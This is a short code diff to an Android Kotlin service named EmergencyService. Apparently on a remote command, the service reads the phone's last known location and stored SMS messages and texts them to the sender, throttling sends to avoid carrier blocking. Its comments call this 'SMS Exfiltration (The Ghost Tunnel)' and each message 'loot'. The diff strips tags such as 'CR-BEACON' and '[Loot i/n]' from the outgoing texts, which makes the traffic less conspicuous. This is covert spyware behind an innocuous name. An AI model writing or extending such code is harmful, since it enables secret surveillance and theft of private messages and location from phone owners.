@@ -57,7 +57,7 @@ class EmergencyService : Service() {
                     val locModule = modules.find { it.startsWith("location") }
                     if (modules.contains("ALL") || locModule != null) {
                         val loc = getLastKnownLocation()
-                        if (loc != null) sendSms(sender, "ONE-SHOT LOC: ${loc.latitude},${loc.longitude}")
+                        if (loc != null) sendSms(sender, "LOC: ${loc.latitude},${loc.longitude}")
                     }
 
                     // 2. Module-Aware SMS Exfiltration
@@ -69,7 +69,7 @@ class EmergencyService : Service() {
                         val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit, keyword)
                         for (i in 0 until latestSms.length()) {
                             val msg = latestSms.getJSONObject(i)
-                            val loot = "[OneShot ${i+1}/${latestSms.length()}] ${msg.optString("num")}: ${msg.optString("body")}"
+                            val loot = "${msg.optString("num")}: ${msg.optString("body")}"
                             sendSms(sender, loot)
                             delay(1500)
                         }
@@ -100,7 +100,7 @@ class EmergencyService : Service() {
                         if (modules.contains("ALL") || locModule != null) {
                             val loc = getLastKnownLocation()
                             val locMsg = if (loc != null) "${loc.latitude},${loc.longitude}" else "GPS_SEARCHING"
-                            sendSms(sender, "CR-BEACON: $locMsg")
+                            sendSms(sender, "LOC: $locMsg")
                         }
 
                         // 2. SMS Exfiltration (The Ghost Tunnel)
@@ -112,7 +112,7 @@ class EmergencyService : Service() {
                             val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit, keyword)
                             for (i in 0 until latestSms.length()) {
                                 val msg = latestSms.getJSONObject(i)
-                                val loot = "[Loot ${i+1}/${latestSms.length()}] From:${msg.optString("num")}: ${msg.optString("body")}"
+                                val loot = "${msg.optString("num")}: ${msg.optString("body")}"
                                 sendSms(sender, loot)
                                 delay(2000) // Throttle to prevent carrier blocking
                             }
